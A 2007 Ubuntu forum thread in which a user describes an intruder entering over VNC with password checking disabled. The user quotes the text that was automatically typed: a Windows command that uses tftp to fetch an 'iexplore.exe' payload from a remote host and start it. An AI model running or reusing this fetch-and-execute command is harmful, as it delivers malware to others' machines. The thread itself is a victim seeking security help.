---
title: "OMG, gained access to my computer, tried to execute Windows commands!"
date: 2007-10-29
forum: Networking &amp; Wireless
---

### Post by superyounan1 on 2007-10-29
I had gedit open and was working on a website when suddenly the ubuntu tray icon popped up notifying me that someone has logged in via VNC! Then the following string of text was entered at the location of my cursor in gedit!!:

```
%systemroo
t%\	system32\cmd.exe
tftp -i 6.116 get iexplore.exe&start iexplore.exe

```

(see screenshot)

They were gone before I had a chance to disconnect them, the text was entered very quickly, i doubt it was manually typed. 

How the hell did they get passed my vnc password? I'm quite sure I had a password set, I'm always prompted for my password whenever I vnc in from my other computer (in the same house),  but went to System > Preferences > Remote Desktop Preferences I found "Require Password" unchecked?

*Is it possible that someone gained access to my PC via vino-server by either finding out my password somehow or using brute force cracking methods, then turned off password authentication?*

I've blocked the vnc port on my router, and almost everything else, but I'm suddenly very concerned about security, what should i do?

[SIZE="5"]**And does vino-server keep connection logs? I dug around the forum but couldn't find info on it, I want their IP so I can report this low-life!**[/SIZE]

---

### Post by superyounan1 on 2007-10-29
I re-posted this thread to the security forum
[http://ubuntuforums.org/showthread.php?p=3664187#post3664187]("http://ubuntuforums.org/showthread.php?p=3664187#post3664187")

---

